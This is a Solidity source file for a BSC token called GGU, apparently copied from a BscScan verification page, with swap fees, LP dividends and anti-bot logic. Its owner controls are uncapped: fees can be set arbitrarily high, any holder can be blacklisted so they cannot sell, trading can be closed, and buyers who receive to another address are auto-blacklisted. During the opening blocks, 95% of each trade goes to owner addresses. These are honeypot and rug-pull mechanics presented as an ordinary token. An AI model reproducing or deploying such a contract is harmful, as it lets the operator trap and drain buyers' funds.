/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private fundAddress2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _usdt;
    mapping(address => bool) private _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor private _tokenDistributor;

    uint256 public _buyFee = 2000;
    uint256 public _sellFee = 2000;

    uint256 public _lpFee = 0;
    uint256 public _destroyFee = 0;
    uint256 public _lpDividendFee = 100;

    uint256 public startTradeBlock;
    address public _mainPair;

    uint256 public _killRobotBlockNum = 2;
    uint256 public _killRobotRate = 95;
    address[]  public _killRobotReceives;
    uint256 public currentReceiveIndex;

    uint256 public _txLimitAmount;
    uint256 public _limitAmount;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address FundAddress2, address ReceiveAddress,
        uint256 TxLimitAmount, uint256 LimitAmount
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        address usdt = USDTAddress;
        IERC20(usdt).approve(RouterAddress, MAX);

        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][RouterAddress] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _swapPairList[usdtPair] = true;
        _mainPair = usdtPair;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        fundAddress2 = FundAddress2;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[FundAddress2] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;

        lpRewardCondition = 30 * 10 ** IERC20(usdt).decimals();
        _txLimitAmount = TxLimitAmount * 10 ** Decimals;
        _limitAmount = LimitAmount * 10 ** Decimals;

        _tokenDistributor = new TokenDistributor(usdt);

        _killRobotReceives.push(FundAddress);
        _killRobotReceives.push(FundAddress2);
        _killRobotReceives.push(ReceiveAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            if (_txLimitAmount > 0) {
                require(_txLimitAmount >= amount, "exceed txLimitAmount");
            }
        }

        uint256 txFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(0 < startTradeBlock, "!Trading");
                if (block.number < startTradeBlock + _killRobotBlockNum) {
                    _funTransfer(from, to, amount);
                    if (_limitAmount > 0 && !_swapPairList[to]) {
                        require(_limitAmount >= balanceOf(to), "exceed LimitAmount");
                    }
                    return;
                }
                uint256 buyFee = _buyFee;
                uint256 sellFee = _sellFee;
                if (!inSwap && _swapPairList[to]) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > 0) {
                        uint256 swapFee = buyFee + sellFee;
                        uint256 numTokensSellToFund = amount * swapFee / 8000;
                        if (numTokensSellToFund > contractTokenBalance) {
                            numTokensSellToFund = contractTokenBalance;
                        }
                        swapTokenForFund(numTokensSellToFund, swapFee);
                    }
                }
                if (_swapPairList[from]) {
                    txFee = buyFee;
                } else {
                    txFee = sellFee;
                }
            }
        }

        _tokenTransfer(from, to, amount, txFee);

        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "exceed LimitAmount");
        }

        if (_swapPairList[to]) {
            addLpProvider(from);
        }

        if (from != address(this)) {
            processLP(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * _killRobotRate / 100;
        address receiveAddress = fundAddress;
        uint256 len = _killRobotReceives.length;
        if (len > 0) {
            if (currentReceiveIndex >= len) {
                currentReceiveIndex = 0;
            }
            receiveAddress = _killRobotReceives[currentReceiveIndex];
            currentReceiveIndex++;
        }
        _takeTransfer(sender, receiveAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (fee > 0) {
            feeAmount = tAmount * fee / 10000;
            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );

            if (_swapPairList[sender]) {
                if (recipient != tx.origin && !_swapPairList[recipient]) {
                    _blackList[recipient] = true;
                }
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        uint256 destroyAmount = tokenAmount * _destroyFee / swapFee;
        if (destroyAmount > 0) {
            tokenAmount -= destroyAmount;
            _tokenTransfer(address(this), address(0x000000000000000000000000000000000000dEaD), destroyAmount, 0);
            swapFee -= _destroyFee;
            if (0 == tokenAmount) {
                return;
            }
        }

        swapFee += swapFee;
        uint256 lpFee = _lpFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        address usdt = _usdt;
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 lpUsdt = usdtBalance * lpFee / swapFee;
        uint256 lpDividendUsdt = usdtBalance * _lpDividendFee * 2 / swapFee;
        USDT.transferFrom(address(_tokenDistributor), address(this), lpUsdt + lpDividendUsdt);

        uint256 fundUsdt = usdtBalance - lpUsdt - lpDividendUsdt;
        if (fundUsdt > 0) {
            USDT.transferFrom(address(_tokenDistributor), fundAddress, fundUsdt / 2);
            USDT.transferFrom(address(_tokenDistributor), fundAddress2, fundUsdt / 2);
        }

        if (lpAmount > 0 && lpUsdt > 0) {
            _swapRouter.addLiquidity(
                address(this), usdt, lpAmount, lpUsdt, 0, 0, fundAddress, block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundAddress2(address addr) external onlyOwner {
        fundAddress2 = addr;
        _feeWhiteList[addr] = true;
    }

    function setFee(uint256 buyFee, uint256 sellFee) external onlyOwner {
        _buyFee = buyFee;
        _sellFee = sellFee;
    }

    function setDestroyFee(uint256 destroyFee) external onlyOwner {
        _destroyFee = destroyFee;
    }

    function setLPDividendFee(uint256 lpDividendFee) external onlyOwner {
        _lpDividendFee = lpDividendFee;
    }

    function setLPFee(uint256 lpFee) external onlyOwner {
        _lpFee = lpFee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function setKillRobotBlockNum(uint256 blockNum) external onlyOwner {
        _killRobotBlockNum = blockNum;
    }

    function setKillRobotRate(uint256 rate) external onlyOwner {
        _killRobotRate = rate;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;
    mapping(address => bool) public excludeLpProvider;

    function getLPHolderLength() public view returns (uint256){
        return lpProviders.length;
    }

    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public lpRewardCondition;
    uint256 public progressLPTime;
    uint256 public _progressBlockDebt = 300;

    function processLP(uint256 gas) private {
        uint256 timestamp = block.timestamp;
        if (progressLPTime + _progressBlockDebt > timestamp) {
            return;
        }
        IERC20 mainpair = IERC20(_mainPair);
        uint totalPair = mainpair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        IERC20 token = IERC20(_usdt);
        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance < lpRewardCondition) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            pairBalance = mainpair.balanceOf(shareHolder);
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = tokenBalance * pairBalance / totalPair;
                if (amount > 0) {
                    token.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressLPTime = timestamp;
    }

    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount * 10 ** _decimals;
    }

    function setTxLimitAmount(uint256 amount) external onlyOwner {
        _txLimitAmount = amount * 10 ** _decimals;
    }

    function setMainPair(address pair) external onlyOwner {
        _mainPair = pair;
    }

    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }

    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    receive() external payable {}

    function getKillRobotReceiveLength() public view returns (uint256){
        return _killRobotReceives.length;
    }

    function getKillRobotReceives() public view returns (address[] memory receives){
        receives = _killRobotReceives;
    }

    function setKillRobotReceives(address[] memory receives) external onlyOwner {
        _killRobotReceives = receives;
    }

    function setFeeWhiteList(address[]memory addr, bool enable) external onlyOwner {
        uint256 len = addr.length;
        for (uint256 i; i < len; ++i) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function addKillRobotReceives(address[]memory addr) external onlyOwner {
        uint256 len = addr.length;
        for (uint256 i; i < len; ++i) {
            _killRobotReceives.push(addr[i]);
        }
    }
}

contract GGU is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "GGU",
        "GGU",
        18,
        2100,
        address(0xA558Aa01b8ad73534c6525CE16C0bF3e338eDfBD),
        address(0x4F72914e12f87c44E5148E80af9937bE757B0c33),
        address(0xc11d911d86b160c475C1a28067E21A8FFADE9D65),
        2,
        10
    ){

    }
}